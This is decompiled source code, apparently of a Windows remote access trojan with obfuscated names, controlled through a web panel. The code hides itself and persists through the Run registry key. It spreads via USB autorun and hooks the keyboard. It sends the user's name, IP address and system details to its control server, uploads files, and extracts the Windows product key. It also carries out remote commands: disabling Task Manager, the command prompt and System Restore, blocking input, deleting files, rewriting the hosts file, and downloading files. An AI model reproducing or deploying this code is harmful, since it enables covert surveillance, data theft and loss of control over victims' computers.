			text = text + "[DIR] " + directoryInfo2.get_Name() + "\r\n";
		}
		return text;
	}

	private string hbjxaatniojs()
	{
		string text = null;
		string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		foreach (string name2 in subKeyNames)
		{
			using RegistryKey registryKey2 = registryKey.OpenSubKey(name2);
			try
			{
				if (registryKey2.GetValue("DisplayName") != null)
				{
					text = ((registryKey2.GetValue("InstallLocation") != null) ? Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject(Operators.AddObject(Operators.ConcatenateObject(registryKey2.GetValue("DisplayName"), (object)"|"), registryKey2.GetValue("InstallLocation")), (object)Environment.NewLine))) : Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(registryKey2.GetValue("DisplayName"), (object)"|"), (object)"Install mupsksfvwukc not known"), (object)Environment.NewLine))));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		return text;
	}

	public string otuplgtgusmhxgkdm()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return array[1];
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Corrupt(string silszkyjkitsnefv, object Corruptionx)
	{
		string text = null;
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Conversions.ToString(Corruptionx)))
		{
			text = Convert.ToBase64String(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Conversions.ToString(Corruptionx)));
		}
		else
		{
			Encoding aSCII = Encoding.ASCII;
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Corruptionx) };
			bool[] array2 = new bool[1] { true };
			object obj = NewLateBinding.LateGet((object)aSCII, (Type)null, "GetBytes", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				Corruptionx = RuntimeHelpers.GetObjectValue(array[0]);
			}
			text = Convert.ToBase64String((byte[])obj);
		}
		FileSystem.FileOpen(1, silszkyjkitsnefv, (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(1, text, -1L, false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long ujnvhakhfeebtsmiswh);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_1(int ktcxxfpbrdbdr, int wMsgx, int wParamx, [MarshalAs(UnmanagedType.VBByRefStr)] ref string nseuwimyzbyx);

	public string tklpjlpudgdtoc(string jtgeemlteijgouml, string filePathx)
	{
		string randomFileName = Path.GetRandomFileName();
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("--" + randomFileName);
		stringBuilder.Append("Content-Disposition: form-data; name=\"uploadedfile\";");
		stringBuilder.AppendFormat("filename=\"{0}\"", Path.GetFileName(filePathx));
		stringBuilder.AppendLine();
		stringBuilder.AppendLine("Content-Type: application/octet-stream");
		stringBuilder.AppendLine();
		byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
		byte[] bytes2 = Encoding.ASCII.GetBytes("\r\n--" + randomFileName + "--\r\n");
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(jtgeemlteijgouml);
		httpWebRequest.ContentType = "multipart/form-data; uxpkerfyvfbrfaze=" + randomFileName;
		httpWebRequest.ContentLength = checked(bytes.Length + new FileInfo(filePathx).Length + bytes2.Length);
		httpWebRequest.Method = "POST";
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		byte[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(filePathx);
		requestStream.Write(array, 0, array.Length);
		requestStream.Write(bytes2, 0, bytes2.Length);
		requestStream.Close();
		string result = default(string);
		return result;
	}

	private int aoejvdbfumlibusif(ref lotnmpkxgxpvturw eeseabisxwjpuw)
	{
		return aoejvdbfumlibusif(ref eeseabisxwjpuw, -1);
	}

	private int aoejvdbfumlibusif(ref lotnmpkxgxpvturw eeseabisxwjpuw, int ojakafdvovbbjfo)
	{
		return NativeMethods.mybylhikjbmfsws(null, ojakafdvovbbjfo, ref eeseabisxwjpuw);
	}

	private void ChangeSettings(lotnmpkxgxpvturw eeseabisxwjpuw)
	{
		NativeMethods.mjfrgmwmcajdixz(ref eeseabisxwjpuw, 0);
	}

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int mciSendString2A([MarshalAs(UnmanagedType.VBByRefStr)] ref string kmmzgmosrkjbcr, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int mnnbscdpmfvCallback);

	public void SetStartCaption(string aumtgugiesz)
	{
		try
		{
			int mnnbscdpmfv = (int)hnbpkivcyzskz("Shell_TrayWnd", null);
			string spz = "button";
			string spz2 = null;
			int ktcxxfpbrdbdr = FindWindowExA(mnnbscdpmfv, 0, ref spz, ref spz2);
			string nseuwimyzbyx = Strings.Mid(aumtgugiesz, 1, 5);
			SendMessageA_1(ktcxxfpbrdbdr, 12, 256, ref nseuwimyzbyx);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowTextA(int mnnbscdpmfv, [MarshalAs(UnmanagedType.VBByRefStr)] ref string fxzydblrkajlgy);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte pdgcdgguczbyycg, byte bScan, int cfhisrzimzgogmglejo, int iblodovulodm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowPos(int mnnbscdpmfv, int gjztuexigkblladxanInsertAfter, int xxx, int yyy, int cxxc, int cyyc, int wFlags);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SendMessageW(IntPtr gjztuexigkblladxan, int Msgsg, IntPtr wParam, IntPtr nseuwimyzby);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int EnableWindow(int mnnbscdpmfv, int nOption);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowExA(int mnnbscdpmfv, int nclass, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string spz2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int nfpobvsmuecdu(int mnnbscdpmfv, int nCmd);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int mnnbscdpmfv, int msgsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string TextStartz);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte pdgcdgguczbyycgx, byte bScan, long cfhisrzimzgogmglejo, long iblodovulodm);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr hnbpkivcyzskz(string mrtfkktrsinpfyfysv, string bkogrmufmrein);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr pfkhyoyvhwua(IntPtr gjztuexigkblladxan, uint eagicrzjdiksdex);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool nfpobvsmuecdu(IntPtr mnnbscdpmfv, int thhebzobppxic);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ruipmwvrky(IntPtr mnnbscdpmfv);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetDC(IntPtr mnnbscdpmfv);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHEmptyRecycleBinA(int gjztuexigkblladxan, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int cfhisrzimzgogmglejo);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHUpdateRecycleBinIcon();

	private void ispraznismece()
	{
		int gjztuexigkblladxan = ((Control)this).get_Handle().ToInt32();
		string pszRootPath = null;
		SHEmptyRecycleBinA(gjztuexigkblladxan, ref pszRootPath, 5);
		SHUpdateRecycleBinIcon();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uyemthnztlmvreduju, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_2(int gjztuexigkblladxan, int wMsgsg, int wParam, int nseuwimyzby);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int zlzoelrbjdtegcx);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string kmmzgmosrkjbcr, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, long uReturnLength, long mnnbscdpmfvCallback);

	public object ykbyjsmtyibhev()
	{
		object result = default(object);
		try
		{
			WebClient webClient = new WebClient();
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(site, (object)"index.php?action=delete") }, (string[])null, (Type[])null, (bool[])null, true);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null));
		try
		{
			WebClient webClient = new WebClient();
			string text2 = default(string);
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)("users.php?action=delete&data=" + Environment.UserName)), (object)"|"), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)"|"), (object)lgtpjnspeljzonvv), (object)"|"), (object)RegionInfo.CurrentRegion.DisplayName), (object)"|"), (object)(text + "|")), (object)text2) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void usb()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), programFiles + "black.scr");
					StreamWriter streamWriter = new StreamWriter(programFiles + "\\autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=" + programFiles + "black.scr");
					streamWriter.WriteLine("shellexecute=" + programFiles, 1);
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "black.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void pokreni(string friylilhkhs, string ApplicationPath)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			RegistryKey registryKey2 = registryKey;
			registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue(friylilhkhs, ApplicationPath);
			registryKey2 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string wbahlsamuabexwp(string uwislpcxxofwp, string ValueNamex)
	{
		checked
		{
			string result = default(string);
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue(uwislpcxxofwp, ValueNamex, (object)0));
				if (objectValue == null)
				{
					result = "N/A";
					return result;
				}
				string text = "";
				int num = Information.LBound((Array)objectValue, 1);
				int num2 = Information.UBound((Array)objectValue, 1);
				for (int i = num; i <= num2; i++)
				{
					text = text + " " + Conversion.Hex(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(objectValue, new object[1] { i }, (string[])null)));
				}
				int num3 = 52;
				string[] array = new string[25]
				{
					"B", "C", "D", "F", "G", "H", "J", "K", "M", "P",
					"Q", "R", "T", "V", "W", "X", "Y", "2", "3", "4",
					"6", "7", "8", "9", null
				};
				int num4 = 29;
				int num5 = 15;
				string[] array2 = new string[16];
				string[] array3 = new string[31];
				string text2 = "";
				int num6 = 67;
				for (int j = 52; j <= num6; j++)
				{
					array2[j - num3] = Conversions.ToString(NewLateBinding.LateIndexGet(objectValue, new object[1] { j }, (string[])null));
					text2 = text2 + " " + Conversion.Hex((object)array2[j - num3]);
				}
				string text3 = "";
				for (int k = num4 - 1; k >= 0; k += -1)
				{
					int num7;
					unchecked
					{
						if (checked(k + 1) % 6 == 0)
						{
							array3[k] = "-";
							text3 += "-";
							continue;
						}
						num7 = 0;
					}
					for (int l = num5 - 1; l >= 0; l += -1)
					{
						int num8 = (int)((long)Math.Round((double)num7 * 256.0) | Conversions.ToLong(array2[l]));
						unchecked
						{
							array2[l] = Conversions.ToString(num8 / 24);
							num7 = num8 % 24;
						}
					}
					array3[k] = array[num7];
					text3 += array[num7];
				}
				result = Strings.StrReverse(text3);
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long ybipwsyhrmpbrujcex);

	public object jyeretxzlvgtwfh()
	{
		gpmnyrnbxpgh.HookKeyboard();
		object result = default(object);
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		jyeretxzlvgtwfh();
		checked
		{
			try
			{
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				text1 = Strings.Space((int)FileSystem.LOF(1));
				this.text2 = Strings.Space((int)FileSystem.LOF(1));
				text3 = Strings.Space((int)FileSystem.LOF(1));
				text4 = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref text1, -1L, false);
				FileSystem.FileGet(1, ref this.text2, -1L, false);
				FileSystem.FileGet(1, ref text3, -1L, false);
				FileSystem.FileGet(1, ref text4, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				options = Strings.Split(text1, "PitonFucker", -1, (CompareMethod)0);
				site = options[1];
				Timer1.set_Interval(Conversions.ToInteger(options[8]));
				if (Operators.CompareString(options[4], "1", false) == 0)
				{
					((Form)this).set_Opacity(Conversions.ToDouble("0"));
					((Control)this).Hide();
					((Control)this).set_Visible(false);
				}
				if (Operators.CompareString(options[3], "1", false) == 0)
				{
					usb();
				}
				if (Operators.CompareString(options[2], "1", false) == 0)
				{
					pokreni(Application.get_ProductName(), Application.get_ExecutablePath());
				}
				if (Operators.CompareString(options[5], "4", false) == 0)
				{
					Interaction.MsgBox((object)options[6], (MsgBoxStyle)64, (object)options[7]);
				}
				if (Operators.CompareString(options[5], "2", false) == 0)
				{
					Interaction.MsgBox((object)options[6], (MsgBoxStyle)32, (object)options[7]);
				}
				if (Operators.CompareString(options[5], "3", false) == 0)
				{
					Interaction.MsgBox((object)options[6], (MsgBoxStyle)48, (object)options[7]);
				}
				if (Operators.CompareString(options[5], "4", false) == 0)
				{
					Interaction.MsgBox((object)options[6], (MsgBoxStyle)16, (object)options[7]);
				}
				tfcwipwwkmfd = (int)hnbpkivcyzskz("Shell_traywnd", "");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			WebClient webClient = new WebClient();
			lgtpjnspeljzonvv = Conversions.ToString(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.AddObject(site, (object)"ip.php") }, (string[])null, (Type[])null, (bool[])null));
			string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null));
			string text2 = Conversions.ToString(Operators.ConcatenateObject(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "~MHz", (object)null), (object)" MB"));
			lxfvpimvgpsd(Environment.UserName + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "|" + lgtpjnspeljzonvv + "|" + RegionInfo.CurrentRegion.DisplayName + "|" + text + "|" + text2);
		}
	}

	public object lxfvpimvgpsd(object datazax)
	{
		object result = default(object);
		try
		{
			WebClient webClient = new WebClient();
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"users.php?action=add&data="), datazax) }, (string[])null, (Type[])null, (bool[])null, true);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public object omxybmpwzhxntrj()
	{
		//IL_10ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_10cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_1109: Unknown result type (might be due to invalid IL or missing references)
		//IL_15c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_15c8: Expected O, but got Unknown
		//IL_15f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1656: Unknown result type (might be due to invalid IL or missing references)
		//IL_165d: Expected O, but got Unknown
		checked
		{
			object result = default(object);
			try
			{
				string text = Conversions.ToString(NewLateBinding.LateGet((object)cnnednnpfoo, (Type)null, "DownloadString", new object[1] { Operators.AddObject(site, (object)"index.php?action=read") }, (string[])null, (Type[])null, (bool[])null));
				ykbyjsmtyibhev();
				if (Operators.CompareString(text.ToString(), "", false) != 0)
				{
					string[] array = Strings.Split(text.ToString(), "|", -1, (CompareMethod)0);
					if ((Operators.CompareString(array[0], Environment.UserName, false) == 0) | (Operators.CompareString(array[0], "ALL", false) == 0))
					{
						if (Operators.CompareString(array[1], "openprogram", false) == 0)
						{
							Interaction.Shell(array[2], (AppWinStyle)1, false, -1);
						}
						if (Operators.CompareString(array[1], "opencdrom", false) == 0)
						{
							string kmmzgmosrkjbcr = "Set CDAudio Door Open Wait";
							string lpstrReturnString = Conversions.ToString(0L);
							mciSendStringA(ref kmmzgmosrkjbcr, ref lpstrReturnString, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "enabletaskmanager", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disabletaskmanager", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enablecmd", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disablecmd", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enableregistry", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disableregistry", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enablesystemrestore", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disablesystemrestore", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "shutdown", false) == 0)
						{
							Interaction.Shell("shutdown -s", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "restart", false) == 0)
						{
							Interaction.Shell("shutdown -r", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "standby", false) == 0)
						{
							Interaction.Shell("shutdown -l", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "hibernation", false) == 0)
						{
							Interaction.Shell("shutdown -h", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "monitoron", false) == 0)
						{
							SendMessageA_2(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
						}
						if (Operators.CompareString(array[1], "monitoroff", false) == 0)
						{
							SendMessageA_2(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
						}
						if (Operators.CompareString(array[1], "keymouon", false) == 0)
						{
							BlockInput(0);
						}
						if (Operators.CompareString(array[1], "keymouoff", false) == 0)
						{
							BlockInput(1);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string kmmzgmosrkjbcr = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref kmmzgmosrkjbcr, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "blocksite", false) == 0)
						{
							StreamWriter streamWriter = new StreamWriter(Interaction.Environ("windir") + "\\System32\\drivers\\etc\\hosts");
							streamWriter.WriteLine("\r\n127.0.0.1 " + array[2]);
							streamWriter.Close();
						}
						if (Operators.CompareString(array[1], "deletefile", false) == 0)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(array[2]);
								fileInfo.Delete();
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "closeprocess", false) == 0)
						{
							try
							{
								Process[] processesByName = Process.GetProcessesByName(array[2]);
								foreach (Process process in processesByName)
								{
									process.Kill();
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "setclipboard", false) == 0)
						{
							Clipboard.SetDataObject((object)array[2], true);
						}
						if (Operators.CompareString(array[1], "mouseup", false) == 0)
						{
							Point position = new Point(0, 0);
							Cursor.set_Position(position);
						}
						if (Operators.CompareString(array[1], "setiehome", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main", "Start Page", (object)array[2]);
						}
						if (Operators.CompareString(array[1], "setiehome", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[2], array[3]);
						}
						if (Operators.CompareString(array[1], "startwrite", false) == 0)
						{
							wayjhryczkvgmesz = array[2];
							draw.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "stopwrite", false) == 0)
						{
							draw.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "lockdesktop", false) == 0)
						{
							fmalatgeabgate = (long)hnbpkivcyzskz("Progman", null);
							EnableWindow((int)fmalatgeabgate, 0);
						}
						if (Operators.CompareString(array[1], "desktopunlock", false) == 0)
						{
							fmalatgeabgate = (long)hnbpkivcyzskz("Progman", null);
							EnableWindow((int)fmalatgeabgate, 1);
						}
						if (Operators.CompareString(array[1], "showclock", false) == 0)
						{
							bzmruvwszphtb = (long)hnbpkivcyzskz("shell_traywnd", null);
							int mnnbscdpmfv = (int)bzmruvwszphtb;
							string lpstrReturnString = "TrayNotifyWnd";
							string kmmzgmosrkjbcr = null;
							psisazbhsxxljkrsbr = FindWindowExA(mnnbscdpmfv, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							int mnnbscdpmfv2 = (int)psisazbhsxxljkrsbr;
							lpstrReturnString = "TrayClockWClass";
							kmmzgmosrkjbcr = null;
							wjndfzfhsysxj = FindWindowExA(mnnbscdpmfv2, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							nfpobvsmuecdu((int)wjndfzfhsysxj, 1);
						}
						if (Operators.CompareString(array[1], "hideclock", false) == 0)
						{
							bzmruvwszphtb = (long)hnbpkivcyzskz("shell_traywnd", null);
							int mnnbscdpmfv3 = (int)bzmruvwszphtb;
							string lpstrReturnString = "TrayNotifyWnd";
							string kmmzgmosrkjbcr = null;
							psisazbhsxxljkrsbr = FindWindowExA(mnnbscdpmfv3, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							int mnnbscdpmfv4 = (int)psisazbhsxxljkrsbr;
							lpstrReturnString = "trayclockwclass";
							kmmzgmosrkjbcr = null;
							wjndfzfhsysxj = FindWindowExA(mnnbscdpmfv4, 0, ref lpstrReturnString, ref kmmzgmosrkjbcr);
							nfpobvsmuecdu((int)wjndfzfhsysxj, 0);
						}
						if (Operators.CompareString(array[1], "shownotify", false) == 0)
						{
							bzmruvwszphtb = (long)hnbpkivcyzskz("shell_traywnd", null);
							int mnnbscdpmfv5 = (int)bzmruvwszphtb;
							string lpstrReturnString = "TrayNotifyWnd";
							string kmmzgmosrkjbcr = null;
